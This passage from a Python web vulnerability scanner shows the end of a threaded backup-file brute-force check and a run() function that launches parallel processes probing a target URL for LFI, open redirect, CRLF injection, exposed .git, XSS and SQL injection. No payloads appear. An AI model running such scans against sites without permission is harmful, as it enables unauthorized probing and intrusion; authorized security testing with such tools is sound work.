                     if str(scode)[0] == '2' or str(scode)[0] == '3' :
                            if str(scode) != str(test_scode):
                                 print("\033[94m[+] Possibly backup file disclosure :\033[00m  "+brute)
                except:
                    pass
                    
    for i in range(threads):
         t = threading.Thread(target=expbf,args=())
         t.start()
     

def run(i):
    if i[-1] == '/':
        i=i[:-1]
    
    p1 = Process(target=lfi_, args=(i,))
    p1.start()
    p2 = Process(target=openredaraction_, args=(i,))
    p2.start()
    p3= Process(target=crlf_, args=(i,))
    p3.start()
    p4 = Process(target=git_, args=(i,))
    p4.start()
    p5 = Process(target=xss_, args=(i,))
    p5.start()
    #p6 = Process(target=backupfile_, args=(i,)) #need more work
    #p6.start()
    p7 = Process(target=sqlinjection, args=(i,)) 
    p7.start()
    
    
